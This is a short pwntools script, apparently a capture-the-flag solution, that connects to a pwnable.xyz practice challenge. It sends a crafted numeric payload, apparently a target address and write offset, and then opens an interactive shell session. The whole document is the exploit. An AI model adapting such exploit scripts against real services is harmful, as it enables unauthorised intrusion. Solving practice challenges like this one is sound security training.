from pwn import *

p = remote("svc.pwnable.xyz", 30002)

payload = "4196386 0 13"
p.sendlineafter("Input: ", payload)
p.sendlineafter(": ", "fff")
p.interactive()